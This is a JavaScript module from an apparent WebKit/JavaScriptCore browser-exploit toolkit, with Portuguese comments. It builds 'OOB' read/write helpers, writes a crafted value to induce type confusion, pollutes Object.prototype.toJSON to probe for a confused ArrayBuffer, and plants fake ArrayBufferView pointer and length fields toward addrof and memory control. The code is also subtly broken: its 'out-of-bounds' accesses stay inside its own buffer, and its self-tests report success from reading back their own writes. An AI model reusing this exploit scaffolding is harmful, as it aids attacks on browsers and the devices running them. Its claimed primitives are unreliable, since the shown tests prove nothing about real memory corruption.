// js/core_exploit.mjs

import { AdvancedInt64, isAdvancedInt64Object, PAUSE, toHex } from './utils.mjs';
import { logS3 as log } from './script3/s3_utils.mjs'; // Logger padrão importado como 'log'
import { OOB_CONFIG, JSC_OFFSETS, updateOOBConfigFromUI } from './config.mjs';

export let oob_array_buffer_real = null;
export let oob_dataview_real = null;
let isOOBEnvironmentSetup = false;

const toHexHelper = (val, bits = 32) => toHex(val, bits);

export function clearOOBEnvironment(options = { force_clear_even_if_not_setup: false }) {
    const FNAME_CLEAR = 'CoreExploit.clearOOBEnvironment';
    // log(`Limpando ambiente OOB... (Setup: ${isOOBEnvironmentSetup}, Force: ${options.force_clear_even_if_not_setup})`, 'info', FNAME_CLEAR);
    if (!isOOBEnvironmentSetup && !options.force_clear_even_if_not_setup) {
        // log("Ambiente OOB já limpo/não configurado e não forçando. Sem ação.", 'info', FNAME_CLEAR);
        return;
    }
    oob_array_buffer_real = null;
    oob_dataview_real = null;
    isOOBEnvironmentSetup = false;
    // log("Ambiente OOB efetivamente limpo.", 'info', FNAME_CLEAR);
}

export function getOOBAllocationSize() {
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
        updateOOBConfigFromUI(document);
    }
    return OOB_CONFIG.ALLOCATION_SIZE;
}

export function getBaseOffsetInDV() {
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
        updateOOBConfigFromUI(document);
    }
    return OOB_CONFIG.BASE_OFFSET_IN_DV;
}

export function getInitialBufferSize() {
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
        updateOOBConfigFromUI(document);
    }
    return OOB_CONFIG.INITIAL_BUFFER_SIZE;
}

export async function triggerOOB_primitive(options = { force_reinit: false }) {
    const FNAME_TRIGGER = 'CoreExploit.triggerOOB_primitive';

    if (isOOBEnvironmentSetup && !options.force_reinit) {
        if (oob_array_buffer_real && oob_dataview_real && oob_array_buffer_real.byteLength === getOOBAllocationSize() && oob_dataview_real.buffer === oob_array_buffer_real) {
            // log("Ambiente OOB já configurado e válido. Usando existente.", 'info', FNAME_TRIGGER);
            return true;
        } else {
            log(`Ambiente OOB marcado como configurado, mas as variáveis são inválidas/inconsistentes. Forçando re-inicialização.`, 'warn', FNAME_TRIGGER);
            clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        }
    }

    // log(`--- Iniciando Configuração do Ambiente OOB (Force reinit: ${options.force_reinit}, Setup anterior: ${isOOBEnvironmentSetup}) ---`, 'test', FNAME_TRIGGER);
    const currentAllocSize = getOOBAllocationSize();
    // log(`   Config OOB: AllocSize=${currentAllocSize}`, 'info', FNAME_TRIGGER);
    clearOOBEnvironment({ force_clear_even_if_not_setup: true }); // Garante que está limpo antes de reconfigurar

    try {
        oob_array_buffer_real = new ArrayBuffer(currentAllocSize);
        oob_dataview_real = new DataView(oob_array_buffer_real, 0, currentAllocSize); // Janela completa
        // log(`Ambiente para Operações OOB CONFIGURADO com sucesso.`, 'good', FNAME_TRIGGER);
        // log(`   oob_array_buffer_real (total): ${oob_array_buffer_real.byteLength} bytes`, 'info', FNAME_TRIGGER);
        // log(`   oob_dataview_real (janela controlada): offset=${oob_dataview_real.byteOffset}, length=${oob_dataview_real.byteLength} bytes`, 'info', FNAME_TRIGGER);
        isOOBEnvironmentSetup = true;
        // log(`--- Configuração do Ambiente OOB Concluída ---`, 'test', FNAME_TRIGGER);
        return true;
    } catch (e) {
        log(`ERRO CRÍTICO em ${FNAME_TRIGGER}: ${e.message}`, 'critical', FNAME_TRIGGER);
        console.error(e);
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        throw e;
    }
}

export function oob_read_absolute(absolute_offset, byteLength) {
    const FNAME_READ = 'CoreExploit.oob_read_absolute';
    if (!isOOBEnvironmentSetup || !oob_dataview_real || oob_dataview_real.buffer.byteLength === 0) {
        log(`ERRO: Ambiente OOB não inicializado ou inválido para leitura em ${toHexHelper(absolute_offset)}`, "error", FNAME_READ);
        if (oob_dataview_real && oob_dataview_real.buffer.byteLength === 0) {
            isOOBEnvironmentSetup = false;
        }
        throw new Error("Ambiente OOB não inicializado ou inválido para leitura.");
    }
    const relative_offset = absolute_offset;
    if (relative_offset < 0 || (relative_offset + byteLength) > oob_dataview_real.byteLength) {
        const errorMsg = `Leitura OOB (abs ${toHexHelper(absolute_offset)} -> rel ${toHexHelper(relative_offset)}, tam ${byteLength}) fora dos limites da DataView (0-${oob_dataview_real.byteLength})`;
        log(errorMsg, "error", FNAME_READ);
        throw new RangeError(errorMsg);
    }
    try {
        switch (byteLength) {
            case 1: return oob_dataview_real.getUint8(relative_offset);
            case 2: return oob_dataview_real.getUint16(relative_offset, true);
            case 4: return oob_dataview_real.getUint32(relative_offset, true);
            case 8: {
                const low = oob_dataview_real.getUint32(relative_offset, true);
                const high = oob_dataview_real.getUint32(relative_offset + 4, true);
                return new AdvancedInt64(low, high);
            }
            default:
                log(`ERRO: Tamanho de leitura inválido: ${byteLength}`, "error", FNAME_READ);
                throw new Error(`Invalid byteLength for read: ${byteLength}`);
        }
    } catch (e) {
        log(`ERRO CRÍTICO em ${FNAME_READ} ao ler de ${toHexHelper(absolute_offset)} (rel ${toHexHelper(relative_offset)}): ${e.message}`, "critical", FNAME_READ);
        if (e.message.includes("detached") || (oob_dataview_real && oob_dataview_real.buffer.byteLength === 0)) {
            isOOBEnvironmentSetup = false;
        }
        throw e;
    }
}

export function oob_write_absolute(absolute_offset, value, byteLength) {
    const FNAME_WRITE = 'CoreExploit.oob_write_absolute';
    if (!isOOBEnvironmentSetup || !oob_dataview_real || oob_dataview_real.buffer.byteLength === 0) {
        log(`ERRO: Ambiente OOB não inicializado ou inválido para escrita em ${toHexHelper(absolute_offset)}`, "error", FNAME_WRITE);
         if (oob_dataview_real && oob_dataview_real.buffer.byteLength === 0) {
            isOOBEnvironmentSetup = false;
        }
        throw new Error("Ambiente OOB não inicializado ou inválido para escrita.");
    }
    const relative_offset = absolute_offset;
    if (relative_offset < 0 || (relative_offset + byteLength) > oob_dataview_real.byteLength) {
        const errorMsg = `Escrita OOB (abs ${toHexHelper(absolute_offset)} -> rel ${toHexHelper(relative_offset)}, tam ${byteLength}) fora dos limites da DataView (0-${oob_dataview_real.byteLength})`;
        log(errorMsg, "error", FNAME_WRITE);
        throw new RangeError(errorMsg);
    }
    try {
        switch (byteLength) {
            case 1: oob_dataview_real.setUint8(relative_offset, Number(value)); break;
            case 2: oob_dataview_real.setUint16(relative_offset, Number(value), true); break;
            case 4: oob_dataview_real.setUint32(relative_offset, Number(value), true); break;
            case 8:
                if (!isAdvancedInt64Object(value)) {
                    if (typeof value === 'number' || typeof value === 'string') {
                        try {
                            value = new AdvancedInt64(value);
                        } catch (convErr) {
                             log(`Falha ao converter valor ${value} para AdvancedInt64: ${convErr.message}`, 'error', FNAME_WRITE);
                             throw new TypeError("Valor para escrita de 8 bytes deve ser AdvancedInt64 ou conversível.");
                        }
                    } else {
                         throw new TypeError("Valor para escrita de 8 bytes deve ser AdvancedInt64.");
                    }
                }
                oob_dataview_real.setUint32(relative_offset, value.low(), true);
                oob_dataview_real.setUint32(relative_offset + 4, value.high(), true);
                break;
            default:
                log(`ERRO: Tamanho de escrita inválido: ${byteLength}`, "error", FNAME_WRITE);
                throw new Error(`Invalid byteLength for write: ${byteLength}`);
        }
    } catch (e) {
        log(`ERRO CRÍTICO em ${FNAME_WRITE} ao escrever em ${toHexHelper(absolute_offset)} (rel ${toHexHelper(relative_offset)}): ${e.message}`, "critical", FNAME_WRITE);
        if (e.message.includes("detached") || (oob_dataview_real && oob_dataview_real.buffer.byteLength === 0)) {
            isOOBEnvironmentSetup = false;
        }
        throw e;
    }
}

export async function selfTestOOBReadWrite(logFnParam) {
    const currentLog = logFnParam || log;
    const FNAME_TEST = 'CoreExploit.selfTestOOBReadWrite';
    currentLog(`--- Iniciando Auto-Teste de OOB R/W (com re-inicialização forçada) ---`, 'test', FNAME_TEST);
    try {
        await triggerOOB_primitive({ force_reinit: true });
        const test_offset = 0x50;
        const test_val32 = 0x11223344;
        currentLog(`   Escrevendo ${toHexHelper(test_val32)} em ${toHexHelper(test_offset)} (32bit)...`, 'info', FNAME_TEST);
        oob_write_absolute(test_offset, test_val32, 4);
        const read_val32 = oob_read_absolute(test_offset, 4);
        if (read_val32 === test_val32) {
            currentLog(`SUCESSO: Lido ${toHexHelper(read_val32)} corretamente (32bit).`, "good", FNAME_TEST);
        } else {
            currentLog(`FALHA: Lido ${toHexHelper(read_val32)}, esperado ${toHexHelper(test_val32)}.`, "error", FNAME_TEST); throw new Error("Self-test 32bit failed");
        }
        const next_offset = test_offset + 8;
        const test_val64 = new AdvancedInt64(0xAABBCCDD, 0xEEFF0011);
        currentLog(`   Escrevendo ${test_val64.toString(true)} em ${toHexHelper(next_offset)} (64bit)...`, 'info', FNAME_TEST);
        oob_write_absolute(next_offset, test_val64, 8);
        const read_val64 = oob_read_absolute(next_offset, 8);
        if (isAdvancedInt64Object(read_val64) && read_val64.equals(test_val64)) {
            currentLog(`SUCESSO: Lido ${read_val64.toString(true)} corretamente (64bit).`, "good", FNAME_TEST);
        } else {
            currentLog(`FALHA: Lido ${isAdvancedInt64Object(read_val64) ? read_val64.toString(true) : String(read_val64)}, esperado ${test_val64.toString(true)}.`, "error", FNAME_TEST); throw new Error("Self-test 64bit failed");
        }
        currentLog(`--- Auto-Teste de OOB R/W Concluído ---`, 'test', FNAME_TEST);
        return true;
    } catch (e) {
        currentLog(`ERRO no Auto-Teste OOB R/W: ${e.message}`, 'critical', FNAME_TEST);
        return false;
    }
}

export function isOOBReady() {
    return isOOBEnvironmentSetup &&
           oob_array_buffer_real instanceof ArrayBuffer &&
           oob_dataview_real instanceof DataView &&
           oob_array_buffer_real.byteLength > 0 &&
           oob_dataview_real.buffer === oob_array_buffer_real &&
           oob_dataview_real.buffer.byteLength > 0;
}

const HEISENBUG_OOB_DATAVIEW_METADATA_BASE = 0x58;
const HEISENBUG_OOB_DATAVIEW_MLENGTH_OFFSET = 0x24;
const HEISENBUG_CRITICAL_WRITE_OFFSET = HEISENBUG_OOB_DATAVIEW_METADATA_BASE + HEISENBUG_OOB_DATAVIEW_MLENGTH_OFFSET; // = 0x7C
const HEISENBUG_CRITICAL_WRITE_VALUE = 0xFFFFFFFF;
// const HEISENBUG_VICTIM_AB_SIZE = 64; // Removido, pois getStableConfusedArrayBuffer agora itera sobre tamanhos

export async function selfTestTypeConfusionAndMemoryControl(logFnParam) {
    const currentLog = logFnParam || log;
    const FNAME_TEST = 'CoreExploit.selfTestTypeConfusionAndMemoryControl';
    currentLog(`--- Iniciando Auto-Teste Combinado: Type Confusion e Controle de Memória para Addrof ---`, 'test', FNAME_TEST);

    let originalToJSONDescriptor = null;
    let pollutionApplied = false;
    let local_probe_details = null;
    let overallSuccess = true;
    const HEISENBUG_VICTIM_AB_SIZE_FOR_SELF_TEST = 64; // Usar um tamanho fixo para o self-test

    try {
        currentLog(`FASE 1: Testando Type Confusion (usando constantes HEISENBUG_*)...`, 'subtest', FNAME_TEST);
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) {
            throw new Error("Falha ao inicializar ambiente OOB para teste de Type Confusion.");
        }
        currentLog(`   (TC) Alvo da corrupção OOB: ${toHexHelper(HEISENBUG_CRITICAL_WRITE_OFFSET)}`, 'info', FNAME_TEST);
        currentLog(`   (TC) PASSO 1: Escrevendo valor CRÍTICO ${toHexHelper(HEISENBUG_CRITICAL_WRITE_VALUE)} em oob_array_buffer_real[${toHexHelper(HEISENBUG_CRITICAL_WRITE_OFFSET)}]...`, "warn", FNAME_TEST);
        oob_write_absolute(HEISENBUG_CRITICAL_WRITE_OFFSET, HEISENBUG_CRITICAL_WRITE_VALUE, 4);
        currentLog(`     (TC) Escrita OOB crítica realizada.`, "info", FNAME_TEST);
        await PAUSE(100);

        let victim_ab_tc = new ArrayBuffer(HEISENBUG_VICTIM_AB_SIZE_FOR_SELF_TEST);
        currentLog(`   (TC) PASSO 2: victim_ab_tc (tamanho ${HEISENBUG_VICTIM_AB_SIZE_FOR_SELF_TEST} bytes) criado.`, "info", FNAME_TEST);

        const toJSON_ProbeForSelfTest_TC = function() {
            local_probe_details = {
                this_type_in_toJSON: Object.prototype.toString.call(this),
                is_victim_ab_tc: (this === victim_ab_tc)
            };
            return { self_test_probe_executed: true };
        };

        const ppKey_TC = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_TC);
        Object.defineProperty(Object.prototype, ppKey_TC, {
            value: toJSON_ProbeForSelfTest_TC,
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;
        currentLog(`     (TC) Object.prototype.${ppKey_TC} poluído com sonda para self-test.`, "info", FNAME_TEST);

        let stringifyOutput_TC = null;
        currentLog(`     (TC) Chamando JSON.stringify(victim_ab_tc)...`, "warn", FNAME_TEST);
        stringifyOutput_TC = JSON.stringify(victim_ab_tc);
        currentLog(`     (TC) JSON.stringify completou. Retorno da sonda: ${stringifyOutput_TC ? stringifyOutput_TC : 'N/A'}`, "info", FNAME_TEST);
        currentLog(`     (TC) Detalhes da sonda: ${local_probe_details ? JSON.stringify(local_probe_details) : 'N/A'}`, "leak", FNAME_TEST);

        if (local_probe_details && local_probe_details.is_victim_ab_tc && local_probe_details.this_type_in_toJSON === "[object Object]") {
            currentLog(`   (TC) SUCESSO: Confusão de tipo detectada no self-test! 'this' é [object Object].`, "vuln", FNAME_TEST);
        } else {
            let detailsMsg = local_probe_details ? `is_victim_ab_tc=${local_probe_details.is_victim_ab_tc}, type=${local_probe_details.this_type_in_toJSON}` : "sonda não forneceu detalhes";
            currentLog(`   (TC) FALHA: Teste de Type Confusion no self-test. Detalhes: ${detailsMsg}. Esperado [object Object] para victim_ab_tc.`, "error", FNAME_TEST);
            overallSuccess = false;
        }
    } catch (e) {
        currentLog(`ERRO na FASE 1 (Type Confusion - SelfTest): ${e.message}${e.stack ? '\n' + e.stack : ''}`, 'critical', FNAME_TEST);
        overallSuccess = false;
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, 'toJSON', originalToJSONDescriptor);
            else delete Object.prototype['toJSON']; // Usar ['toJSON'] para delete
            currentLog(`     (TC) Object.prototype.toJSON restaurado (SelfTest).`, "info", FNAME_TEST);
            pollutionApplied = false;
            originalToJSONDescriptor = null;
        }
    }

    if (!overallSuccess) {
        currentLog(`Teste de Type Confusion (SelfTest) falhou. Abortando teste de Controle de Memória.`, 'warn', FNAME_TEST);
        currentLog(`--- Auto-Teste Combinado CONCLUÍDO COM FALHA ---`, 'test', FNAME_TEST);
        return false;
    }

    await PAUSE(200);

    currentLog(`FASE 2: Testando Controle de Memória...`, 'subtest', FNAME_TEST);
    try {
        if (!isOOBReady()) {
            currentLog(`   (MC) Ambiente OOB não estava pronto. Reconfigurando...`, 'warn', FNAME_TEST);
            await triggerOOB_primitive({ force_reinit: true });
            if (!isOOBReady()) throw new Error("Falha ao (re)inicializar ambiente OOB para teste de Controle de Memória.");
        }

        const OFFSET_M_VECTOR_CONTENTS = HEISENBUG_OOB_DATAVIEW_METADATA_BASE + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
        const OFFSET_M_LENGTH_CONTENTS = HEISENBUG_OOB_DATAVIEW_METADATA_BASE + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
        const OFFSET_M_MODE_CONTENTS   = HEISENBUG_OOB_DATAVIEW_METADATA_BASE + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET;

        const PLANT_VAL_M_VECTOR_LOW  = 0xAABBCCDD;
        const PLANT_VAL_M_VECTOR_HIGH = 0x11223344;
        const PLANT_M_VECTOR = new AdvancedInt64(PLANT_VAL_M_VECTOR_LOW, PLANT_VAL_M_VECTOR_HIGH);
        const PLANT_M_LENGTH = 0x7FFFFFFF;
        const PLANT_M_MODE = 0x00000001;

        currentLog(`   (MC) Configurando estrutura hipotética de ArrayBufferView em oob_array_buffer_real:`, 'info', FNAME_TEST);
        currentLog(`     m_vector (@${toHexHelper(OFFSET_M_VECTOR_CONTENTS)}) para ${PLANT_M_VECTOR.toString(true)}`, 'info', FNAME_TEST);
        oob_write_absolute(OFFSET_M_VECTOR_CONTENTS, PLANT_M_VECTOR, 8);
        currentLog(`     m_length (@${toHexHelper(OFFSET_M_LENGTH_CONTENTS)}) para ${toHexHelper(PLANT_M_LENGTH)}`, 'info', FNAME_TEST);
        oob_write_absolute(OFFSET_M_LENGTH_CONTENTS, PLANT_M_LENGTH, 4);
        currentLog(`     m_mode   (@${toHexHelper(OFFSET_M_MODE_CONTENTS)}) para ${toHexHelper(PLANT_M_MODE)}`, 'info', FNAME_TEST);
        oob_write_absolute(OFFSET_M_MODE_CONTENTS, PLANT_M_MODE, 4);

        currentLog(`   (MC) Verificando valores plantados:`, 'info', FNAME_TEST);
        const read_m_vector = oob_read_absolute(OFFSET_M_VECTOR_CONTENTS, 8);
        const read_m_length = oob_read_absolute(OFFSET_M_LENGTH_CONTENTS, 4);
        const read_m_mode   = oob_read_absolute(OFFSET_M_MODE_CONTENTS, 4);

        currentLog(`     Lido m_vector (@${toHexHelper(OFFSET_M_VECTOR_CONTENTS)}): ${read_m_vector.toString(true)}`, "leak", FNAME_TEST);
        currentLog(`     Lido m_length (@${toHexHelper(OFFSET_M_LENGTH_CONTENTS)}): ${toHexHelper(read_m_length)}`, "leak", FNAME_TEST);
        currentLog(`     Lido m_mode   (@${toHexHelper(OFFSET_M_MODE_CONTENTS)}): ${toHexHelper(read_m_mode)}`, "leak", FNAME_TEST);

        let memoryControlSuccess = true;
        if (!read_m_vector.equals(PLANT_M_VECTOR)) {
            currentLog(`   (MC) FALHA: m_vector lido (${read_m_vector.toString(true)}) não corresponde ao plantado (${PLANT_M_VECTOR.toString(true)}).`, "error", FNAME_TEST);
            memoryControlSuccess = false;
        }
        if (read_m_length !== PLANT_M_LENGTH) {
            currentLog(`   (MC) FALHA: m_length lido (${toHexHelper(read_m_length)}) não corresponde ao plantado (${toHexHelper(PLANT_M_LENGTH)}).`, "error", FNAME_TEST);
            memoryControlSuccess = false;
        }
        if (read_m_mode !== PLANT_M_MODE) {
             currentLog(`   (MC) FALHA: m_mode lido (${toHexHelper(read_m_mode)}) não corresponde ao plantado (${toHexHelper(PLANT_M_MODE)}).`, "error", FNAME_TEST);
            memoryControlSuccess = false;
        }

        if (memoryControlSuccess) {
            currentLog(`   (MC) SUCESSO: Controle de m_vector, m_length e m_mode verificado!`, "vuln", FNAME_TEST);
        } else {
            currentLog(`   (MC) FALHA: Teste de Controle de Memória.`, "error", FNAME_TEST);
            overallSuccess = false;
        }
    } catch (e) {
        currentLog(`ERRO na FASE 2 (Controle de Memória - SelfTest): ${e.message}${e.stack ? '\n' + e.stack : ''}`, 'critical', FNAME_TEST);
        overallSuccess = false;
    }

    if (overallSuccess) {
        currentLog(`--- Auto-Teste Combinado CONCLUÍDO COM SUCESSO ---`, 'test', FNAME_TEST);
        return true;
    } else {
        currentLog(`--- Auto-Teste Combinado CONCLUÍDO COM FALHA ---`, 'test', FNAME_TEST);
        return false;
    }
}

// =======================================================================================
// FUNÇÃO getStableConfusedArrayBuffer MODIFICADA PARA V10
// =======================================================================================
export async function getStableConfusedArrayBuffer(options = { victim_sizes: [64, 48, 80, 128], log_prefix: "CoreExploit" }) {
    const FNAME_GETTER = `${options.log_prefix}.getStableConfusedArrayBuffer_V10`;
    log(`[${FNAME_GETTER}] Iniciando processo para obter ArrayBuffer confuso... (Tentando tamanhos: ${options.victim_sizes.join(', ')})`, "info", FNAME_GETTER);

    for (const current_victim_size of options.victim_sizes) {
        log(`[${FNAME_GETTER}] Tentando com victim_ab_size = ${current_victim_size}`, "info", FNAME_GETTER);
        try {
            await triggerOOB_primitive({ force_reinit: true });
            if (!isOOBReady()) {
                // Log adicional em caso de falha ao inicializar OOB
                log(`[${FNAME_GETTER}] Falha em isOOBReady() após triggerOOB_primitive para victim_size ${current_victim_size}.`, "error", FNAME_GETTER);
                throw new Error(`Ambiente OOB não pôde ser inicializado para getStableConfusedArrayBuffer (size: ${current_victim_size}).`);
            }

            log(`[${FNAME_GETTER}] Realizando escrita OOB crítica em ${toHexHelper(HEISENBUG_CRITICAL_WRITE_OFFSET)} para induzir Heisenbug (size: ${current_victim_size})...`, "warn", FNAME_GETTER);
            oob_write_absolute(HEISENBUG_CRITICAL_WRITE_OFFSET, HEISENBUG_CRITICAL_WRITE_VALUE, 4);
            log(`[${FNAME_GETTER}] Escrita OOB crítica realizada (size: ${current_victim_size}).`, "info", FNAME_GETTER);
        } catch (e) {
            log(`[${FNAME_GETTER}] ERRO na preparação do ambiente OOB ou na escrita crítica (size: ${current_victim_size}): ${e.message}`, "critical", FNAME_GETTER);
            log(`[${FNAME_GETTER}] Limpando ambiente OOB após erro na preparação para o tamanho ${current_victim_size}.`, "info", FNAME_GETTER);
            clearOOBEnvironment({ force_clear_even_if_not_setup: true }); // Limpa antes de tentar o próximo tamanho
            continue; 
        }

        await PAUSE(50); 

        let confused_ab_candidate = new ArrayBuffer(current_victim_size);
        log(`[${FNAME_GETTER}] Candidato a ArrayBuffer confuso (tamanho ${current_victim_size}) criado: ${confused_ab_candidate}`, "info", FNAME_GETTER);

        let isConfirmedConfused = false;
        let observedTypeForCandidate = "";
        let originalToJSONDescriptorForGetter = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
        let tempPollutedByGetter = false;
        let probeDetailsFromGetter = {}; 

        try {
            Object.defineProperty(Object.prototype, 'toJSON', {
                writable: true, configurable: true, enumerable: false,
                value: function MinimalProbeForGetter_V10() { // 'this' é o objeto sendo stringificado
                    probeDetailsFromGetter.called_count = (probeDetailsFromGetter.called_count || 0) + 1;
                    const current_this_type = Object.prototype.toString.call(this);
                    if (this === confused_ab_candidate) {
                        probeDetailsFromGetter.is_candidate_match = true;
                        observedTypeForCandidate = current_this_type;
                        probeDetailsFromGetter.type_observed_on_candidate = observedTypeForCandidate;
                        log(`[${FNAME_GETTER}-Probe_V10] 'this' é confused_ab_candidate (size ${current_victim_size}). Tipo: ${observedTypeForCandidate}. Chamada #${probeDetailsFromGetter.called_count}`, "info");
                        if (observedTypeForCandidate === '[object Object]') {
                            isConfirmedConfused = true;
                        }
                    } else {
                        probeDetailsFromGetter.is_candidate_match = false;
                        // Logar apenas se for a primeira chamada ou se o tipo for interessante
                        if (probeDetailsFromGetter.called_count === 1 || current_this_type === '[object Object]') {
                            log(`[${FNAME_GETTER}-Probe_V10] 'this' NÃO é confused_ab_candidate (size ${current_victim_size}). 'this' é ${current_this_type}. Chamada #${probeDetailsFromGetter.called_count}`, "info");
                        }
                    }
                    return { getter_probe_V10_executed: true, is_candidate: (this === confused_ab_candidate), type_at_call: current_this_type };
                }
            });
            tempPollutedByGetter = true;

            log(`[${FNAME_GETTER}] Chamando JSON.stringify no candidato (size ${current_victim_size}) para verificar confusão...`, "info", FNAME_GETTER);
            const stringifyOutput = JSON.stringify(confused_ab_candidate);
            // Log após stringify ter completado, para ver o estado final dos detalhes da sonda
            log(`[${FNAME_GETTER}] JSON.stringify (size ${current_victim_size}) retornou: ${stringifyOutput}. Detalhes finais da sonda interna: ${JSON.stringify(probeDetailsFromGetter)}`, "info");

        } catch (e_verify) {
            log(`[${FNAME_GETTER}] Erro durante verificação interna da confusão (size ${current_victim_size}): ${e_verify.message}`, "error", FNAME_GETTER);
        } finally {
            if (tempPollutedByGetter) {
                if (originalToJSONDescriptorForGetter) {
                    Object.defineProperty(Object.prototype, 'toJSON', originalToJSONDescriptorForGetter);
                } else {
                    delete Object.prototype['toJSON']; // Mais seguro para delete
                }
                // log(`[${FNAME_GETTER}] Object.prototype.toJSON restaurado (size ${current_victim_size}).`, "info");
            }
        }

        if (isConfirmedConfused) {
            log(`[${FNAME_GETTER}] CONFIRMADO: ArrayBuffer (tamanho ${current_victim_size}) está confuso (tipo: ${observedTypeForCandidate}). Retornando...`, "vuln", FNAME_GETTER);
            return confused_ab_candidate;
        } else {
            log(`[${FNAME_GETTER}] FALHA: ArrayBuffer (tamanho ${current_victim_size}) NÃO apresentou confusão esperada (tipo final na sonda: ${probeDetailsFromGetter.type_observed_on_candidate || observedTypeForCandidate || 'N/A'}).`, "error", FNAME_GETTER);
            log(`[${FNAME_GETTER}] Limpando ambiente OOB após falha na confusão para o tamanho ${current_victim_size}.`, "info", FNAME_GETTER);
            clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        }
    } 

    log(`[${FNAME_GETTER}] Nenhuma confusão obtida para os tamanhos testados: ${options.victim_sizes.join(', ')}. Retornando null.`, "error", FNAME_GETTER);
    return null;
}
